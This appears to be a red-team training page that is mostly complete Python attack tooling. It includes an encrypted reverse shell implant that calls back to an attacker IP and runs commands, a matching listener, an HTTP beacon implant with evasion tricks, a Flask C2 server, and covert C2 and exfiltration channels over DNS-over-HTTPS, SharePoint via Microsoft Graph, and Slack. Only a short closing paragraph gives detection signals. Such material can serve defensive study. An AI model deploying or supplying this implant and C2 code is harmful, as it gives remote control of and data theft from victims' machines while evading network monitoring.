---
layout: training-page
title: "Python C2 & Reverse Shells — Red Team Academy"
module: "Tool Development"
tags:
  - python
  - c2
  - reverse-shell
  - beacon
  - encryption
  - listener
page_key: "tooldev-python-c2-shells"
render_with_liquid: false
---

# Python C2 & Reverse Shells

## Overview

A Command and Control (C2) channel has two components: an **implant** (runs on the victim, calls home) and a **listener** (runs on the attacker, receives connections and issues commands). This module builds both from scratch in Python, adding AES-256 encryption to protect command traffic from network inspection, and HTTP polling to blend in with normal web traffic. Understanding these primitives helps with both building custom tools and detecting/responding to them.

Dependencies: `pip install pycryptodome flask`. The reverse shell uses only stdlib. The beacon requires `requests` + `pycryptodome`.

## Encrypted TCP Reverse Shell

An AES-256-CBC encrypted reverse shell over a raw TCP socket. The session key is derived via a simple ECDH-like exchange — here simplified to a hardcoded PSK for clarity; replace with proper key exchange in production use. Commands are sent from the listener to the implant; output is returned encrypted.

```
#!/usr/bin/env python3
"""
rev_shell_client.py — AES-256-CBC encrypted reverse shell implant (victim-side).
Connects back to LHOST:LPORT, receives AES-encrypted commands, executes them,
and returns AES-encrypted output.

Companion: rev_shell_listener.py (run on attacker box first)

Encryption scheme:
  - Shared 32-byte key derived from PSK via SHA-256 (expand with PBKDF2 for real ops)
  - Each message: 16-byte random IV prepended to AES-CBC ciphertext
  - Length-prefixed framing: 4-byte big-endian uint32 message length before ciphertext
"""

import os
import socket
import struct
import subprocess
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ── Configuration — change before deploying ──────────────────────────────────
LHOST = "10.10.14.5"    # attacker listener IP
LPORT = 4444            # attacker listener port
PSK   = b"ChangeThisKey_32BytesExactly!!!"  # pre-shared key (must be 32 bytes)
# ─────────────────────────────────────────────────────────────────────────────

def derive_key(psk: bytes) -> bytes:
    """Derive a 32-byte AES key from the PSK using SHA-256."""
    return hashlib.sha256(psk).digest()

def encrypt(key: bytes, plaintext: bytes) -> bytes:
    """
    AES-256-CBC encrypt plaintext.
    Returns: IV (16 bytes) + ciphertext (PKCS7 padded).
    """
    iv     = os.urandom(16)                         # fresh random IV per message
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext, AES.block_size))

def decrypt(key: bytes, data: bytes) -> bytes:
    """
    AES-256-CBC decrypt. Expects IV prepended to ciphertext.
    Returns: plaintext bytes.
    """
    iv, ct = data[:16], data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

def send_msg(sock: socket.socket, data: bytes) -> None:
    """Length-prefix framing: send 4-byte big-endian length then data."""
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_msg(sock: socket.socket) -> bytes:
    """Receive a length-prefixed message; blocks until the full message arrives."""
    raw_len = recvall(sock, 4)
    length  = struct.unpack(">I", raw_len)[0]
    return recvall(sock, length)

def recvall(sock: socket.socket, n: int) -> bytes:
    """Receive exactly n bytes from the socket (handles partial reads)."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("socket closed before receiving all data")
        buf += chunk
    return buf

def run_command(cmd: str) -> bytes:
    """
    Execute a shell command and capture combined stdout + stderr.
    Uses shell=True for full shell features; set to False for safer exec.
    """
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=30
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return b"[!] Command timed out\n"
    except Exception as e:
        return f"[!] Error: {e}\n".encode()

def connect_and_loop() -> None:
    key = derive_key(PSK)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((LHOST, LPORT))
    print(f"[*] Connected to {LHOST}:{LPORT}")

    while True:
        try:
            # Receive encrypted command from listener
            enc_cmd = recv_msg(sock)
            cmd     = decrypt(key, enc_cmd).decode("utf-8", errors="replace").strip()

            if cmd.lower() in ("exit", "quit", "bye"):
                break

            # Execute and encrypt the output
            output  = run_command(cmd)
            enc_out = encrypt(key, output if output else b"[no output]")
            send_msg(sock, enc_out)

        except (ConnectionError, OSError):
            break

    sock.close()

if __name__ == "__main__":
    connect_and_loop()
```

```
#!/usr/bin/env python3
"""
rev_shell_listener.py — Encrypted reverse shell listener (attacker-side).
Listens on 0.0.0.0:LPORT, accepts one connection, and provides an interactive
command prompt. All traffic is AES-256-CBC encrypted.

Usage: python3 rev_shell_listener.py [--port 4444]
"""

import socket
import struct
import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from argparse import ArgumentParser

PSK = b"ChangeThisKey_32BytesExactly!!!"  # must match client

def derive_key(psk: bytes) -> bytes:
    return hashlib.sha256(psk).digest()

def encrypt(key, plaintext):
    iv = os.urandom(16)
    return iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))

def decrypt(key, data):
    return unpad(AES.new(key, AES.MODE_CBC, data[:16]).decrypt(data[16:]), 16)

def recvall(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed")
        buf += chunk
    return buf

def send_msg(sock, data):
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_msg(sock):
    length = struct.unpack(">I", recvall(sock, 4))[0]
    return recvall(sock, length)

def listen(port: int) -> None:
    key    = derive_key(PSK)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] Listening on 0.0.0.0:{port} — waiting for connection...")

    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}\n")

    while True:
        try:
            cmd = input("shell> ").strip()
            if not cmd:
                continue
            send_msg(conn, encrypt(key, cmd.encode()))
            if cmd.lower() in ("exit", "quit", "bye"):
                break
            enc_out = recv_msg(conn)
            output  = decrypt(key, enc_out).decode("utf-8", errors="replace")
            print(output, end="" if output.endswith("\n") else "\n")
        except (EOFError, KeyboardInterrupt):
            break
        except ConnectionError:
            print("[!] Connection lost")
            break

    conn.close()
    server.close()

if __name__ == "__main__":
    ap = ArgumentParser()
    ap.add_argument("--port", type=int, default=4444)
    listen(ap.parse_args().port)
```

## HTTP Beacon Implant

An HTTP-based beacon polls a C2 server at configurable intervals with random jitter. Commands are delivered in the HTTP response body (base64-encoded, XOR-obfuscated); output is POSTed back. The polling pattern mimics normal browser traffic — GET requests to a CDN-style URL, with a realistic User-Agent header.

```
#!/usr/bin/env python3
"""
http_beacon.py — HTTP polling beacon implant.
Polls C2_URL/check-in every SLEEP ± jitter seconds.
Commands received in response body (base64+XOR). Output POSTed to C2_URL/result.

Designed to blend with normal HTTPS traffic by using:
- Realistic browser User-Agent
- Randomised sleep intervals (jitter)
- GET for tasking, POST for results
- Optional proxy support (set HTTP_PROXY / HTTPS_PROXY env vars)
"""

import base64
import os
import random
import subprocess
import sys
import time
import urllib.request
import urllib.error

# ── Configuration ─────────────────────────────────────────────────────────────
C2_URL   = "https://c2.example.com"          # Replace with your C2 server URL
XOR_KEY  = b"\x41\x42\x43\x44\x45\x46\x47\x48"  # 8-byte XOR key (match server)
SLEEP    = 60                                 # Base sleep interval in seconds
JITTER   = 0.3                               # Jitter: ±30% of SLEEP
AGENT_ID = os.urandom(8).hex()              # Random implant identifier
UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
# ─────────────────────────────────────────────────────────────────────────────

def xor_bytes(data: bytes, key: bytes) -> bytes:
    """XOR data with a repeating key — symmetric, so encrypt = decrypt."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def decode_command(encoded: str) -> str | None:
    """
    Decode a command received from the C2 server.
    Protocol: base64( XOR( command_bytes ) )
    Returns None if the response is the 'no task' sentinel.
    """
    try:
        raw  = base64.b64decode(encoded.strip())
        cmd  = xor_bytes(raw, XOR_KEY).decode("utf-8")
        return None if cmd == "IDLE" else cmd
    except Exception:
        return None

def encode_output(output: bytes) -> bytes:
    """Encode command output for POST to C2: XOR then base64."""
    return base64.b64encode(xor_bytes(output, XOR_KEY))

def make_request(url: str, data: bytes | None = None) -> bytes:
    """
    Send an HTTP GET (data=None) or POST (data=bytes) request.
    Uses urllib to avoid the requests dependency; adds a browser User-Agent.
    """
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    req.add_header("User-Agent", UA)
    req.add_header("X-Agent-ID", AGENT_ID)   # implant identifier (obfuscate in real ops)
    if data:
        req.add_header("Content-Type", "application/octet-stream")

    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read()

def execute_command(cmd: str) -> bytes:
    """Run a shell command and return combined stdout+stderr."""
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        return proc.stdout + proc.stderr or b"[no output]"
    except subprocess.TimeoutExpired:
        return b"[timeout]"
    except Exception as e:
        return f"[error: {e}]".encode()

def beacon_loop() -> None:
    """Main beacon loop: check in, execute tasks, sleep with jitter."""
    print(f"[*] Beacon started — ID: {AGENT_ID}, C2: {C2_URL}")

    while True:
        try:
            # Check in: GET /check-in?id=AGENT_ID
            checkin_url = f"{C2_URL}/check-in?id={AGENT_ID}"
            response    = make_request(checkin_url)

            cmd = decode_command(response.decode("utf-8", errors="replace"))

            if cmd:
                print(f"[*] Task received: {cmd[:60]}...")
                output = execute_command(cmd)

                # POST result back: /result?id=AGENT_ID
                result_url = f"{C2_URL}/result?id={AGENT_ID}"
                make_request(result_url, data=encode_output(output))

        except urllib.error.URLError as e:
            # Network error — beacon continues silently, will retry next cycle
            pass
        except Exception:
            pass

        # Sleep with jitter: SLEEP * (1 ± JITTER)
        jitter_factor = 1 + random.uniform(-JITTER, JITTER)
        sleep_time    = max(5.0, SLEEP * jitter_factor)  # minimum 5 seconds
        time.sleep(sleep_time)

if __name__ == "__main__":
    beacon_loop()
```

## HTTP C2 Listener Server (Flask)

The server-side component receives beacon check-ins, queues commands entered via the operator CLI, and collects results. Flask is used for simplicity — replace with a proper async framework (FastAPI, aiohttp) for production use with many agents.

```
#!/usr/bin/env python3
"""
c2_server.py — Minimal HTTP C2 listener for the http_beacon.py implant.
Usage: python3 c2_server.py [--port 8443] [--tls]
Operator interface: type commands at the 'operator>' prompt.
The server queues them; the next beacon check-in delivers the task.

Dependencies: pip install flask pycryptodome
"""

import base64
import threading
from collections import defaultdict
from flask import Flask, request, Response

# Must match beacon config
XOR_KEY = b"\x41\x42\x43\x44\x45\x46\x47\x48"

app = Flask(__name__)

# ── In-memory state (replace with DB for persistent ops) ─────────────────────
task_queue:    dict[str, list[str]] = defaultdict(list)   # agent_id -> [pending tasks]
result_store:  dict[str, list[str]] = defaultdict(list)   # agent_id -> [results]
seen_agents:   set[str]             = set()
state_lock = threading.Lock()
# ─────────────────────────────────────────────────────────────────────────────

def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encode_task(cmd: str) -> str:
    """Encode a command for delivery: XOR then base64."""
    return base64.b64encode(xor_bytes(cmd.encode(), XOR_KEY)).decode()

def decode_result(encoded: bytes) -> str:
    """Decode a POSTed result: base64 then XOR."""
    try:
        raw = base64.b64decode(encoded)
        return xor_bytes(raw, XOR_KEY).decode("utf-8", errors="replace")
    except Exception as e:
        return f"[decode error: {e}]"

@app.route("/check-in", methods=["GET"])
def checkin():
    """Beacon polls this endpoint. Returns next queued task or 'IDLE' sentinel."""
    agent_id = request.args.get("id", "unknown")
    with state_lock:
        seen_agents.add(agent_id)
        if task_queue[agent_id]:
            cmd = task_queue[agent_id].pop(0)
            print(f"\n[*] Delivering task to {agent_id}: {cmd}")
            return Response(encode_task(cmd), mimetype="text/plain")
        # No pending task — return IDLE sentinel
        return Response(encode_task("IDLE"), mimetype="text/plain")

@app.route("/result", methods=["POST"])
def result():
    """Beacon POSTs results here after executing a task."""
    agent_id = request.args.get("id", "unknown")
    output   = decode_result(request.data)
    with state_lock:
        result_store[agent_id].append(output)
    print(f"\n[OUTPUT from {agent_id}]\n{output}\noperator> ", end="", flush=True)
    return Response("OK", status=200)

def operator_cli() -> None:
    """Interactive operator prompt running in a background thread."""
    print("[*] C2 server started. Type ' ' to task an agent.")
    print("[*] Type 'agents' to list connected agents, 'results ' to view results.")
    while True:
        try:
            line = input("operator> ").strip()
            if not line:
                continue
            if line == "agents":
                with state_lock:
                    agents = list(seen_agents)
                print(f"[*] Seen agents: {agents}")
            elif line.startswith("results "):
                aid = line.split(None, 1)[1]
                with state_lock:
                    res = result_store.get(aid, [])
                for r in res:
                    print(r)
            else:
                # Format: "agent_id command"
                parts = line.split(None, 1)
                if len(parts) == 2:
                    aid, cmd = parts
                    with state_lock:
                        task_queue[aid].append(cmd)
                    print(f"[*] Task queued for {aid}: {cmd}")
                else:
                    print("[!] Usage:  ")
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down")
            break

if __name__ == "__main__":
    from argparse import ArgumentParser
    ap = ArgumentParser()
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--host", default="0.0.0.0")
    args = ap.parse_args()

    # Operator CLI in background thread so Flask can serve in the main thread
    t = threading.Thread(target=operator_cli, daemon=True)
    t.start()

    print(f"[*] C2 listener on {args.host}:{args.port}")
    # For TLS: ssl_context="adhoc" requires pip install pyopenssl
    app.run(host=args.host, port=args.port, debug=False)
```

## Covert C2 Channels

When port 443 is monitored or outbound TCP is filtered, fall back to channels that blend with legitimate corporate traffic. All three channels below share the same ChaCha20-Poly1305 encrypted message envelope and jitter timer.

### Message Envelope (all channels)

```
{
  "id":   "1fb6e9d8",      // 4-byte implant identifier (SHA-256 prefix)
  "ts":   1717523267,      // unix epoch
  "seq":  42,              // rolling counter — replay protection
  "op":   "poll",          // poll | exfil | exec | ack
  "body": "BASE64(ChaCha20-Poly1305(ciphertext))"
}
```

**Why ChaCha20-Poly1305?** No AES hardware noise, 16-byte auth tag, and available in both the Python `cryptography` package and Go stdlib. Nonce = first 12 bytes of `HMAC-SHA256(id‖seq‖ts)` — unique per frame, no nonce reuse.

### Channel 1 — DNS-over-HTTPS (DoH) Beacon

Embeds the encrypted envelope as a base64url DNS query name. Uses Google/Cloudflare DoH endpoints — the request looks identical to legitimate HTTPS traffic to those IPs.

```
#!/usr/bin/env python3
"""
dns_beacon.py — C2 implant side: DNS-over-HTTPS beacon.
Dependencies: pip install cryptography requests
"""
from __future__ import annotations
import base64, hashlib, json, os, secrets, time
import requests
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# ─── CONFIG ────────────────────────────────────────────────────────────────
C2_KEY  = bytes.fromhex("b6" * 32)       # replace with real 256-bit key
DOH_URL = [
    "https://dns.google/dns-query",
    "https://cloudflare-dns.com/dns-query",
]
IMPLANT_ID = os.urandom(4).hex()          # 4-byte ID, stable per session
# ───────────────────────────────────────────────────────────────────────────

def nonce(id4: str, seq: int, ts: int) -> bytes:
    raw = id4.encode() + seq.to_bytes(4, "big") + ts.to_bytes(4, "big")
    return hashlib.sha256(raw).digest()[:12]

def encrypt(op: str, payload: bytes = b"") -> str:
    seq  = secrets.randbelow(2**32)
    ts   = int(time.time())
    aead = ChaCha20Poly1305(C2_KEY)
    ct   = aead.encrypt(nonce(IMPLANT_ID, seq, ts), payload, None)
    env  = {
        "id": IMPLANT_ID, "ts": ts, "seq": seq, "op": op,
        "body": base64.b64encode(ct).decode(),
    }
    return base64.urlsafe_b64encode(json.dumps(env).encode()).rstrip(b"=").decode()

def beacon():
    q   = encrypt("poll")
    url = f"{secrets.choice(DOH_URL)}?dns={q}"
    hdr = {"Accept": "application/dns-message",
           "User-Agent": "Mozilla/5.0 (compatible)"}
    r = requests.get(url, headers=hdr, timeout=10)
    # Listener decodes the DNS answer TXT record for the tasking
    print(f"[*] Beacon sent, status={r.status_code}")

while True:
    beacon()
    time.sleep(30 + secrets.randbelow(30))   # 30–60 s jitter
```

### Channel 2 — Microsoft Graph API (O365)

Reads/writes to SharePoint list items using a legitimate M365 OAuth app registration. Traffic is indistinguishable from normal Office 365 usage.

```
#!/usr/bin/env python3
"""
o365_beacon.py — C2 channel via Microsoft Graph SharePoint list items.
Requires: Azure app registration with Sites.ReadWrite.All permission.
Dependencies: pip install msal cryptography
"""
from __future__ import annotations
import base64, hashlib, json, secrets, time
import msal, requests
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# ─── CONFIG ────────────────────────────────────────────────────────────────
TENANT_ID   = "your-tenant-id"
CLIENT_ID   = "your-app-client-id"
CLIENT_SEC  = "your-app-client-secret"
SITE_ID     = "your-sharepoint-site-id"
LIST_ID     = "your-list-id"
C2_KEY      = bytes.fromhex("b6" * 32)
IMPLANT_ID  = secrets.token_hex(4)
# ───────────────────────────────────────────────────────────────────────────

def get_token() -> str:
    app = msal.ConfidentialClientApplication(
        CLIENT_ID, CLIENT_SEC,
        authority=f"https://login.microsoftonline.com/{TENANT_ID}"
    )
    result = app.acquire_token_for_client(
        scopes=["https://graph.microsoft.com/.default"]
    )
    return result["access_token"]

def post_item(token: str, payload: dict):
    """Write encrypted beacon as a SharePoint list item."""
    url = (f"https://graph.microsoft.com/v1.0/sites/{SITE_ID}"
           f"/lists/{LIST_ID}/items")
    headers = {"Authorization": f"Bearer {token}",
               "Content-Type": "application/json"}
    body = {"fields": {"Title": IMPLANT_ID,
                       "Body": json.dumps(payload)}}
    requests.post(url, headers=headers, json=body, timeout=10)

def get_tasks(token: str) -> list[dict]:
    """Poll for tasking items addressed to this implant."""
    url = (f"https://graph.microsoft.com/v1.0/sites/{SITE_ID}"
           f"/lists/{LIST_ID}/items?$expand=fields"
           f"&$filter=fields/Title eq 'task-{IMPLANT_ID}'")
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(url, headers=headers, timeout=10)
    return r.json().get("value", [])

while True:
    try:
        tok = get_token()
        post_item(tok, {"id": IMPLANT_ID, "op": "poll"})
        tasks = get_tasks(tok)
        for task in tasks:
            print(f"[TASK] {task['fields'].get('Body')}")
    except Exception as e:
        print(f"[!] {e}")
    time.sleep(60 + secrets.randbelow(60))
```

### Channel 3 — Slack Incoming Webhook

Exfiltrates data as Slack messages using a workspace bot token. Blend-in: every corp Slack already has dozens of bots.

```
#!/usr/bin/env python3
"""
slack_beacon.py — C2 exfil via Slack API. Implant side.
Dependencies: pip install slack-sdk cryptography
"""
from __future__ import annotations
import base64, json, os, secrets, time
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from slack_sdk import WebClient

# ─── CONFIG ────────────────────────────────────────────────────────────────
SLACK_TOKEN  = os.getenv("SLACK_BOT_TOKEN")   # xoxb-...
CHANNEL      = "#general"                      # target channel or DM
C2_KEY       = bytes.fromhex("b6" * 32)
# ───────────────────────────────────────────────────────────────────────────

client = WebClient(token=SLACK_TOKEN)

def exfil(data: bytes):
    aead = ChaCha20Poly1305(C2_KEY)
    nonce = os.urandom(12)
    ct    = aead.encrypt(nonce, data, None)
    msg   = base64.b64encode(nonce + ct).decode()
    # Split into 1500-char chunks to stay under Slack message limit
    for i in range(0, len(msg), 1500):
        client.chat_postMessage(channel=CHANNEL, text=msg[i:i+1500])
    print(f"[+] Exfiltrated {len(data)} bytes via Slack")

def poll_tasks() -> list[str]:
    """Read recent messages from listener bot — parse commands."""
    result = client.conversations_history(channel=CHANNEL, limit=5)
    tasks  = []
    for msg in result["messages"]:
        if msg.get("text", "").startswith("CMD:"):
            tasks.append(msg["text"][4:])
    return tasks

while True:
    exfil(b"beacon poll")
    for task in poll_tasks():
        print(f"[TASK] {task}")
    time.sleep(30 + secrets.randbelow(30))
```

### Degradation Strategy

All three channels are wrapped in a single implant that tries each in order until one succeeds:

```
CHANNELS = [dns_beacon, o365_beacon, slack_beacon]

def send_beacon():
    for channel in CHANNELS:
        try:
            channel()
            return    # success — stop trying
        except Exception as e:
            print(f"[-] Channel failed: {e}")
    print("[!] All channels failed — sleeping 5m")
    time.sleep(300)
```

**Detection signals:** DoH beaconing to `8.8.8.8:443` with fixed query patterns; SharePoint API calls from unusual user agents; Slack bots posting base64 blobs. Blue team: watch for encoded strings in Slack webhook traffic and anomalous Graph API application IDs.

## Resources

- Python C2 & Reverse Shells course module — AES/ChaCha20 channels, DoH/Graph/Slack beacons
- `cryptography` Python library — `cryptography.io`
- `paramiko` — SSH2 protocol implementation
- `flask` — lightweight HTTP C2 listener framework
- `msal` — Microsoft Authentication Library for Python
- `slack-sdk` — official Slack Python SDK
- ChaCha20-Poly1305 IETF RFC 8439
